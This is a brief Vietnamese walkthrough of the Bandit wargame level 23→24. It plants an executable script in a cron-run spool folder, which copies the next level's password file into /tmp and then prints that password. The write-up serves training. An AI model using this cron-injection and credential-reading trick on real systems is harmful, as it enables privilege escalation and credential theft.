# Bandit 23 → 24

## Mục tiêu

đặt script cho cron chạy.

## Tôi thấy

Tôi đọc script trước, thấy cron chạy mọi file owned bởi bandit23 trong `foo`.

## Cách làm

```bash
printf "#!/bin/bash\ncat /etc/bandit_pass/bandit24 > /tmp/out\n" > /var/spool/bandit24/foo/get.sh
chmod +x /var/spool/bandit24/foo/get.sh
```

## Vì sao cách này hiệu quả

Cron chạy script bằng quyền bandit24, nên script có thể đọc password đó.

## Kết quả

Password của `bandit24` trong phiên đã xác minh là:

```text
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
```

